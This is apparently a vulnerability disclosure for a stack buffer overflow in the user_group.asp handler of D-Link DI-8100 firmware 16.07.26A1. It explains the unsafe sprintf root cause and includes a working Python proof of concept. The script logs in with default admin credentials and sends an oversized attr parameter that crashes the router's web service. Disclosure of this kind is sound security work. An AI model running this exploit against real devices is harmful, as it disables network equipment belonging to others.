## Vulnerability Report: D-Link DI-8100 `user_group.asp` Buffer Overflow


#### 1. Summary

| Field | Value |
| :--- | :--- |
| **Title** | D-Link DI-8100 16.07.26A1 `user_group.asp` Stack Buffer Overflow |
| **Vendor** | D-Link |
| **Firmware Version** | 16.07.26A1 |
| **Vulnerability Type** | Stack-based Buffer Overflow (CWE-120) |
| **Affected Component** | `/user_group.asp` (CGI handler) |


#### 2. Vulnerability Description

A stack-based buffer overflow vulnerability exists in the web management interface of D-Link DI-8100 devices running firmware version **16.07.26A1**.

The vulnerability resides in the CGI handler responsible for processing the `/user_group.asp` endpoint (specifically within the function located at offset `0x0046ecec` in the binary `user_group_asp@0046ecec.c`). The application uses an unsafe `sprintf` function to concatenate user-supplied parameters (`name`, `mem`, `pri`, `attr`) into a fixed-size stack buffer without performing any bounds checking.

By sending a specially crafted HTTP POST request containing an overly long string in the `attr` (or other affected) parameter, an authenticated attacker can overflow the buffer, corrupting the stack. This results in a Denial of Service (DoS) condition causing the HTTP service to crash and potentially allowing Remote Code Execution (RCE) depending on the memory layout and payload construction.

#### 3. Technical Details

**3.1 Vulnerable Code Pattern**

The root cause is the use of `sprintf` instead of `snprintf`.
<img width="1767" height="577" alt="image" src="https://github.com/user-attachments/assets/1f34da23-1c89-4610-ae38-f5e81ec63e80" />

<img width="1690" height="344" alt="image" src="https://github.com/user-attachments/assets/d6f4f637-af28-4bcc-990f-ac7170bf1168" />




#### 5. Proof of Concept (PoC)

The following Python script demonstrates the vulnerability by sending a long string of "A" characters to the `attr` parameter.

```python
import sys
import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
PAYLOAD_LEN = 400000

s = requests.Session()
s.post(f"http://{TARGET}/login.cgi", data={"user": "admin", "password": "admin"}, timeout=5)

try:
    s.post(
        f"http://{TARGET}/user_group.asp",
        data={"opt": "add", "name": "test", "mem": "512", "pri": "1", "attr": "A" * PAYLOAD_LEN, "id": "0"},
        timeout=10
    )
except requests.exceptions.ConnectionError:
    print("[!] Connection reset - overflow triggered, service likely crashed.")
    sys.exit(0)

print("[-] No crash observed, target may not be vulnerable.")
```
<img width="2195" height="219" alt="image" src="https://github.com/user-attachments/assets/55a0070f-0900-4e8f-a81e-eb1c8333833e" />


